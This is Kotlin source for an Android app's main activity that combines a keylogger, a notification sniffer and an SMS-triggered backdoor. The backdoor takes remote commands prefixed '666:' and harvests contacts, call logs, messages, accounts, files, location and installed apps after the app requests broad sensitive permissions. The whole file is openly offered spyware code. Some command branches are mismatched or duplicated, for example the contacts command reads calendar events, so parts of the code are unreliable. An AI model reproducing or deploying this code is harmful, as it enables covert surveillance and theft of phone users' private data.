package com.evilthreads.evademe

import android.Manifest
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.evilthreads.drawersnifferlib.DrawerSniffer
import com.evilthreads.evade.evade
import com.evilthreads.keylogger.Keylogger
import com.evilthreads.pickpocket.*
import com.evilthreads.smsbackdoor.SmsBackdoor
import com.evilthreads.wakescopelib.suspendedWakeScope
import com.evilthreads.wakescopelib.wakeScope
import com.kotlinpermissions.KotlinPermissions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class MainActivity : AppCompatActivity() {
    val TAG = this.javaClass.simpleName
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val payload = suspend {
            withContext(Dispatchers.Default) {
                val keyloggerJob = launch {
                    Keylogger.subscribe { entry ->
                        Log.d("KEYLOGGER", entry.toString())
                    }
                }
                launch {
                    DrawerSniffer.subscribe(this@MainActivity) { notification ->
                        Log.d("DRAWERSNIFFER", notification.toString())
                    }
                }.join()
                keyloggerJob.join()
            }

        }
        KotlinPermissions.with(this)
            .permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION)
            .onAccepted {
                SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
                    runBlocking {
                        when (remoteCommand) {
                            "COMMAND_GET_CONTACTS" -> calendarFlow().collect { calendarEvent -> Log.d("PICKPOCKET", calendarEvent.toString()) }
                            "COMMAND_GET_CALL_LOG" -> callLogFlow().collect { call -> Log.d("PICKPOCKET", call.toString()) }
                            "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
                            "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
                            "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
                            "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
                            "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
                            "COMMAND_GET_DEVICE_INFO" -> deviceFlow().collect { device -> Log.d("PICKPOCKET", device.toString()) }
                            "COMMAND_GET_LOCATION" -> deviceFlow().collect { location -> Log.d("PICKPOCKET", location.toString()) }
                            "COMMAND_GET_SETTINGS" -> settingsFlow().collect { setting -> Log.d("PICKPOCKET", setting.toString()) }
                            "COMMAND_GET_INSTALLED_APPS" -> softwareFlow().collect { app -> Log.d("PICKPOCKET", app.toString()) }
                            else -> Log.d(TAG, "COMMAND NOT FOUND")
                        }
                    }
                }
                Keylogger.requestPermission(this)
                if (!DrawerSniffer.hasPermission(this))
                    DrawerSniffer.requestPermission(this)
            }.ask()
    }
}